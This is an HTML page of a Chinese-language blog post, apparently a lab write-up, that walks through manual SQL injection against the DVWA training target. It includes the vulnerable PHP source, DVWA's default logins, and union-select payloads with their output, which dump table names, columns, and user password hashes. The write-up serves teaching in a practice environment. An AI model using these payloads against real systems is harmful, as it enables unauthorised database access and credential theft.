@@ -1,0 +1,957 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.5.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.5.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.5.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.5.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="Intro靶场：dvwa默认Username&amp;amp;Password一共有五个：admin/passwordgordonb/abc1231337/charleypablo/letmeinsmithy/password    手工注入思路：1.判断是否存在注入，注入是字符型还是数字型2.猜解SQL查询语句中的字段数3.确定显示的字段顺序4.获取当前数据库5.获取数据库中的表6.获取表中的字段名7.">
+<meta name="keywords" content="Information Security">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL injection of dvwa">
+<meta property="og:url" content="http://yoursite.com/2019/03/01/SQL Injection of dvwa/index.html">
+<meta property="og:site_name" content="kawhi">
+<meta property="og:description" content="Intro靶场：dvwa默认Username&amp;amp;Password一共有五个：admin/passwordgordonb/abc1231337/charleypablo/letmeinsmithy/password    手工注入思路：1.判断是否存在注入，注入是字符型还是数字型2.猜解SQL查询语句中的字段数3.确定显示的字段顺序4.获取当前数据库5.获取数据库中的表6.获取表中的字段名7.">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-03-05T07:34:44.061Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL injection of dvwa">
+<meta name="twitter:description" content="Intro靶场：dvwa默认Username&amp;amp;Password一共有五个：admin/passwordgordonb/abc1231337/charleypablo/letmeinsmithy/password    手工注入思路：1.判断是否存在注入，注入是字符型还是数字型2.猜解SQL查询语句中的字段数3.确定显示的字段顺序4.获取当前数据库5.获取数据库中的表6.获取表中的字段名7.">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/01/SQL Injection of dvwa/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>SQL injection of dvwa | kawhi</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">kawhi</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">Life is brief,and then you die,you know?</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-首页"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-归档"></i> <br>归档<span class="badge">27</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-分类"></i> <br>分类<span class="badge">11</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-标签"></i> <br>标签<span class="badge">0</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-关于"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-search">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/search/" rel="section"><i class="menu-item-icon fa fa-fw fa-搜索"></i> <br>搜索</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/01/SQL Injection of dvwa/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="kawhi">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/kawhi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kawhi">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL injection of dvwa
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-01 19:27:48" itemprop="dateCreated datePublished" datetime="2019-03-01T19:27:48+08:00">2019-03-01</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-03-05 15:34:44" itemprop="dateModified" datetime="2019-03-05T15:34:44+08:00">2019-03-05</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/SQL/" itemprop="url" rel="index"><span itemprop="name">SQL</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>靶场：dvwa<br>默认Username&amp;Password一共有五个：<br>admin/password<br>gordonb/abc123<br>1337/charley<br>pablo/letmein<br>smithy/password   </p>
+<p>手工注入思路：<br>1.判断是否存在注入，注入是字符型还是数字型<br>2.猜解SQL查询语句中的字段数<br>3.确定显示的字段顺序<br>4.获取当前数据库<br>5.获取数据库中的表<br>6.获取表中的字段名<br>7.下载数据    </p>
+<h2 id="Level：low"><a href="#Level：low" class="headerlink" title="Level：low"></a>Level：low</h2><h3 id="View-Source"><a href="#View-Source" class="headerlink" title="View Source"></a>View Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">SQL Injection Source</span><br><span class="line"><span class="meta">&lt;?php</span>     </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">    $getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id'"</span>;</span><br><span class="line">    $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,<span class="string">"first_name"</span>);</span><br><span class="line">        $last = mysql_result($result,$i,<span class="string">"last_name"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ID: '</span> . $id . <span class="string">'&lt;br&gt;First name: '</span> . $first . <span class="string">'&lt;br&gt;Surname: '</span> . $last;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>从php源代码中可以看出该题没有设置任何过滤。  </p>
+</li>
+<li><p>后台的查询语句是<code>select first_name, last_name from users where user_id = &#39;$id&#39;;</code>，<code>$id</code>就是你在submit提交框内输入的内容，通过<code>$_GET</code>方法传递给后台服务器。    </p>
+</li>
+<li><p>mysql_qurry()：向指定的关联服务器中的当前活动数据库发送一条查询语句（不支持多条查询）。</p>
+</li>
+<li><p>mysql_numrows()：现在写法是mysql_num_rows()，返回结果集中行的数目，此命令仅对select语句有用。</p>
+</li>
+</ol>
+<h3 id="判断注入点及类型"><a href="#判断注入点及类型" class="headerlink" title="判断注入点及类型"></a>判断注入点及类型</h3><p>这题通过源代码可以知道存在字符型注入，但是在现实场景中是无法看到后端php代码的，所以需要我们通过盲注来推断存在何种注入。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输入：1</span></span><br><span class="line"> ID: 1</span><br><span class="line"> First name: admin</span><br><span class="line"> Surname: admin</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入：1'</span></span><br><span class="line"> You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds</span><br><span class="line"> <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span></span><br><span class="line"> <span class="keyword">use</span> near <span class="string">''</span><span class="number">1</span><span class="string">''' at line 1</span></span><br><span class="line"><span class="string">注意返回的报错信息：''1'''</span>    ==&gt;    <span class="string">'    '</span>  <span class="number">1</span><span class="string">'   '</span>     <span class="string">'</span></span><br><span class="line"><span class="string">最外面一层单引号包含错误信息，里面的一层单引号告诉我们ID字段为字符型数据，</span></span><br><span class="line"><span class="string">最里面的1'</span>是我们的输入内容，由此可以判断这里存在单引号型注入</span><br></pre></td></tr></table></figure></p>
+<p>也可以采用and大法来判断<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输入：1 and 1 = 1</span></span><br><span class="line"> ID: 1 and 1=1</span><br><span class="line"> First name: admin</span><br><span class="line"> Surname: admin</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入：1 and 1 = 2</span></span><br><span class="line"> ID: 1 and 1=2</span><br><span class="line"> First name: admin</span><br><span class="line"> Surname: admin</span><br><span class="line"></span><br><span class="line">发现两者都能爆出数据，因而为字符型注入。</span><br></pre></td></tr></table></figure></p>
+<h3 id="猜测所查表中的字段数"><a href="#猜测所查表中的字段数" class="headerlink" title="猜测所查表中的字段数"></a>猜测所查表中的字段数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输入：1' or 1=1 order by 1#</span></span><br><span class="line"> ID: 1' or 1=1 order by 1<span class="comment">#</span></span><br><span class="line"> First name: admin</span><br><span class="line"> Surname: admin</span><br><span class="line"></span><br><span class="line"> ID: 1' or 1=1 order by 1<span class="comment">#</span></span><br><span class="line"> First name: Bob</span><br><span class="line"> Surname: Smith</span><br><span class="line"></span><br><span class="line"> ID: 1' or 1=1 order by 1<span class="comment">#</span></span><br><span class="line"> First name: Gordon</span><br><span class="line"> Surname: Brown</span><br><span class="line"></span><br><span class="line"> ID: 1' or 1=1 order by 1<span class="comment">#</span></span><br><span class="line"> First name: Hack</span><br><span class="line"> Surname: Me</span><br><span class="line"></span><br><span class="line"> ID: 1' or 1=1 order by 1<span class="comment">#</span></span><br><span class="line"> First name: Pablo</span><br><span class="line"> Surname: Picasso</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入：1' or 1=1 order by 2#</span></span><br><span class="line"> ID: 1' or 1=1 order by 2<span class="comment">#</span></span><br><span class="line"> First name: admin</span><br><span class="line"> Surname: admin</span><br><span class="line"></span><br><span class="line"> ID: 1' or 1=1 order by 2<span class="comment">#</span></span><br><span class="line"> First name: Gordon</span><br><span class="line"> Surname: Brown</span><br><span class="line"></span><br><span class="line"> ID: 1' or 1=1 order by 2<span class="comment">#</span></span><br><span class="line"> First name: Hack</span><br><span class="line"> Surname: Me</span><br><span class="line"></span><br><span class="line"> ID: 1' or 1=1 order by 2<span class="comment">#</span></span><br><span class="line"> First name: Pablo</span><br><span class="line"> Surname: Picasso</span><br><span class="line"></span><br><span class="line"> ID: 1' or 1=1 order by 2<span class="comment">#</span></span><br><span class="line"> First name: Bob</span><br><span class="line"> Surname: Smith</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入：1' or 1=1 order by 3#</span></span><br><span class="line">  Unknown column '3' in 'order clause'</span><br><span class="line">  说明此表中只有两个字段</span><br></pre></td></tr></table></figure>
+<p>也可以采用 union select 来猜测表中字段数<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输入：1' union select 1#</span></span><br><span class="line"> The used <span class="keyword">SELECT</span> statements have a different <span class="built_in">number</span> <span class="keyword">of</span> <span class="keyword">columns</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输入：1' union select 1,2#</span></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,2#</span></span><br><span class="line"><span class="string"> First name: admin</span></span><br><span class="line"><span class="string"> Surname: admin</span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">第一次查询失败，第二次查询正确，说明有两个字段</span><br></pre></td></tr></table></figure></p>
+<h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#暴库</span></span><br><span class="line"> 输入：1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,database()#</span></span><br><span class="line"><span class="string"> First name: admin</span></span><br><span class="line"><span class="string"> Surname: admin</span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()<span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: dvwa</span><br><span class="line"></span><br><span class="line"> 暴出数据库名：dvwa</span><br><span class="line"></span><br><span class="line"><span class="comment">#暴表</span></span><br><span class="line"> 输入：<span class="number">1</span><span class="string">' union select 1,table_name from information_schema.tables where table_schema = '</span>dvwa<span class="string">'#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'dvwa'</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,table_name from information_schema.tables where table_schema = '</span>dvwa<span class="string">'#</span></span><br><span class="line"><span class="string"> First name: 1</span></span><br><span class="line"><span class="string"> Surname: guestbook</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'dvwa'</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: <span class="keyword">users</span></span><br><span class="line"></span><br><span class="line"> 暴出了两个表：guestbook 和 <span class="keyword">users</span>，猜测有关用户名和密码存放在<span class="keyword">users</span>表中</span><br><span class="line"></span><br><span class="line"><span class="comment">#暴字段</span></span><br><span class="line"> 输入：<span class="number">1</span><span class="string">' union select 1,column_name from information_schema.columns where table_name = '</span><span class="keyword">users</span><span class="string">'#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="string">'user'</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,column_name from information_schema.columns where table_name = '</span><span class="keyword">user</span><span class="string">'#</span></span><br><span class="line"><span class="string"> First name: 1</span></span><br><span class="line"><span class="string"> Surname: Host</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="string">'user'</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: <span class="keyword">User</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,column_name from information_schema.columns where table_name = '</span><span class="keyword">user</span><span class="string">'#</span></span><br><span class="line"><span class="string"> First name: 1</span></span><br><span class="line"><span class="string"> Surname: Password</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="string">'user'</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: Select_priv</span><br><span class="line"></span><br><span class="line"> 可以看到暴出了很多字段（这里只截取了一部分）：Host, <span class="keyword">User</span>, <span class="keyword">Password</span>, ···</span><br><span class="line"> 但是关键的还是<span class="keyword">User</span>和<span class="keyword">Password</span>字段</span><br><span class="line"></span><br><span class="line"><span class="comment">#暴出User和Password字段内容</span></span><br><span class="line"> 输入：<span class="number">1</span><span class="string">' union select 1,concat(User,'</span> <span class="string">',Password) from users#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">concat</span>(<span class="keyword">User</span>,<span class="string">' '</span>,<span class="keyword">Password</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,concat(User,'</span> <span class="string">',Password) from users#</span></span><br><span class="line"><span class="string"> First name: 1</span></span><br><span class="line"><span class="string"> Surname: admin 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">concat</span>(<span class="keyword">User</span>,<span class="string">' '</span>,<span class="keyword">Password</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: gordonb e99a18c428cb38d5f260853678922e03</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,concat(User,'</span> <span class="string">',Password) from users#</span></span><br><span class="line"><span class="string"> First name: 1</span></span><br><span class="line"><span class="string"> Surname: 1337 8d3533d75ae2c3966d7e0d4fcc69216b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">concat</span>(<span class="keyword">User</span>,<span class="string">' '</span>,<span class="keyword">Password</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: pablo <span class="number">0</span>d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,concat(User,'</span> <span class="string">',Password) from users#</span></span><br><span class="line"><span class="string"> First name: 1</span></span><br><span class="line"><span class="string"> Surname: smithy 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> 这样就暴出了用户名和密码</span></span><br></pre></td></tr></table></figure>
+<p>cancat()函数：concat(str1,str2,···)，连接一个或者多个字符串。   </p>
